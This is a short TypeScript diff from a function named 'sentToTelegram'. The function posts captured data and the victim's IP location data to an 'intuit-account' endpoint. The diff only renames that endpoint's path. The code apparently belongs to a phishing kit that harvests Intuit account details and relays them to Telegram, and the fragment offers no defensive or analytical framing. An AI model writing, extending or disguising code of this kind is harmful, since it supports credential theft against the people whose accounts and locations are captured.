@@ -35,7 +35,7 @@ export async function sentToTelegram(rawData: string): Promise<{
     const protocol = host?.includes("localhost") ? "http" : "https";
 
     const { data: axiosResponse } = await axios.post(
-      `${protocol}://${host}/api/intuit-account`,
+      `${protocol}://${host}/u/w/intuit-account`,
       {
         data: data?.data,
         ipLocationData: data.ipLocationData,
